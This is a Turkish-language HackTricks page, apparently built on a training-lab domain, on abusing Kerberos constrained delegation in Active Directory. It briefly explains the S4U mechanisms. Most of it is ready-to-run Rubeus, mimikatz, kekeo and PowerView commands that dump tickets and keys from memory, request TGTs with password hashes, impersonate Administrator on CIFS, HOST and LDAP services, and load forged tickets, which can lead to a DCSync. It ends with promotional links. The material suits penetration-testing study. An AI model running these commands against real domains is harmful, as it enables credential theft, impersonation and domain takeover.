# Kısıtlanmış Delegeleme

Bu yöntemle bir **Etki Alanı yöneticisi**, bir makinenin bir **hizmetine karşı bir kullanıcı veya bilgisayarın taklit edilmesine izin verebilir**.

* **Kullanıcı için Hizmet (**_**S4U2self**_**):** Bir **hizmet hesabı**, [TRUSTED\_TO\_AUTH\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) (T2A4D) içeren bir _userAccountControl_ değerine sahipse, başka herhangi bir kullanıcı adına kendisi (hizmet) için bir TGS alabilir.
* **Proxy için Kullanıcı için Hizmet(**_**S4U2proxy**_**):** Bir **hizmet hesabı**, **msDS-AllowedToDelegateTo**'da belirtilen hizmete herhangi bir kullanıcı adına bir TGS alabilir. Bunun için önce o kullanıcıdan kendisine bir TGS alması gerekmektedir, ancak diğerini istemeden önce S4U2self'i kullanarak o TGS'yi alabilir.

**Not**: Bir kullanıcı AD'de '_Hesap hassas ve delege edilemez_' olarak işaretlenmişse, onları **taklit edemezsiniz**.

Bu, eğer bir hizmetin hash'ini **ele geçirirseniz**, kullanıcıları **taklit edebilir** ve **hizmete erişim** elde edebilirsiniz (mümkün olan **hak yükseltme**).

Dahası, sadece kullanıcının taklit edebildiği hizmete değil, **herhangi bir hizmete de erişiminiz olacak**, çünkü SPN (istenen hizmet adı) kontrol edilmiyor, sadece yetkiler kontrol ediliyor. Bu nedenle, **CIFS hizmetine** erişiminiz varsa, Rubeus'ta `/altservice` bayrağını kullanarak **HOST hizmetine** de erişebilirsiniz.

Ayrıca, **DC üzerindeki LDAP hizmetine** erişim, bir **DCSync** saldırısını gerçekleştirmek için gereklidir.

{% code title="Sorgula" %}
```bash
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```
{% code title="TGT'yi Al" %}
```bash
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
{% endcode %}

{% hint style="warning" %}
TGT biletini veya RC4 veya AES256'yı sistem olmadan elde etmenin diğer yolları vardır, örneğin Yazıcı Hatası ve sınırlamaları kaldırma, NTLM yönlendirme ve Active Directory Sertifika Hizmeti kötüye kullanımı.

TGT biletine (veya karmasına) sahip olmanız durumunda, tüm bilgisayarı tehlikeye atmadan bu saldırıyı gerçekleştirebilirsiniz.
{% endhint %}

{% code title="Rubeus Kullanımı" %}
```bash
#Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

#Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```
{% code title="kekeo + Mimikatz" %}
```bash
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
{% endcode %}

[**Daha fazla bilgi için ired.team'e bakın.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin.**
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github reposuna **PR göndererek paylaşın.**

</details>
